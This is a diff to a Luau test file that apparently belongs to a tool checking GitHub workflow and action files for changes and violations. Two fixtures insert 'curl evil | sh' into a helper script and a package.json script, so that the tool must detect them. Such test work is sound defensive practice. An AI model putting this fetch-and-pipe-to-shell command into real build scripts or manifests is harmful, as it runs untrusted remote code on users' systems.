@@ -164,6 +164,11 @@ suite.describe('inspect', function()
       { 'continue-on-error', '.github/workflows/notify.yaml', '      - run: echo said', '      - run: echo said\n        continue-on-error: true' },
       { 'defaults', '.github/workflows/notify.yaml', 'jobs:\n', 'defaults:\n  run:\n    shell: sh\njobs:\n' },
       { 'helper', 'scripts/shared/helper.sh', '', 'echo helping\n' },
+      { 'run-name', '.github/workflows/notify.yaml', 'name: Notify\n', 'name: Notify\nrun-name: pwned\n' },
+      { 'action-runs', '.github/actions/setup/action.yml', '  using: composite', '  using: composite\n  post-if: always()' },
+      { 'beside-an-action', '.github/actions/setup/lib/helper.sh', '', 'curl evil | sh\n' },
+      { 'template', '.github/action_templates/consumer.yaml', '', 'permissions:\n  id-token: write\n' },
+      { 'node-manifest', 'package.json', '', '{"scripts": {"diagrams": "curl evil | sh"}}\n' },
     }
 
     for _, change in changes do
@@ -171,6 +176,14 @@ suite.describe('inspect', function()
       local root = support.broken(fs.join(scratchRoot, 'golden'), { id = change[1], edits = { edit } } :: any)
       expect(`{change[1]}: {tostring(inspected(root) ~= base)}`).toBe(`{change[1]}: true`)
     end
+
+    -- An existing helper's contents, not only its existence: same file, same count, new digest.
+    local function withHelper(name: string, contents: string): string
+      local edit = { file = 'scripts/shared/helper.sh', find = '', replace = contents }
+      return inspected(support.broken(fs.join(scratchRoot, 'golden'), { id = name, edits = { edit } } :: any))
+    end
+
+    expect(withHelper('helper-before', 'echo one\n') ~= withHelper('helper-after', 'echo two\n')).toBe(true)
   end)
 end)
 
@@ -264,6 +277,19 @@ suite.describe('check', function()
       'error[FORGE-E051]: .github/workflows/build.yml (jobs.publish.needs): build/publish: missing needed job aa',
       'error[FORGE-E051]: .github/workflows/build.yml (jobs.release.needs): build/release: missing needed job zz',
     }, '\n'))
+  end)
+
+  suite.it('reads actions in the order Rust sorted their paths, so its first finding is the Rust\'s', function()
+    local case = (function(): any
+      for _, entry in support.corpus().case do
+        if entry.id == 'action-folders-in-path-order' then return entry end
+      end
+
+      return nil
+    end)()
+    local report = commands.check({ root = support.broken(fs.join(scratchRoot, 'pathorder'), case) }).report
+    expect(report[1].code).toBe 'FORGE-E050'
+    expect(report[1].path).toBe '.github/actions/a/action.yml'
   end)
 
   suite.it('reports every violation, not only the first', function()
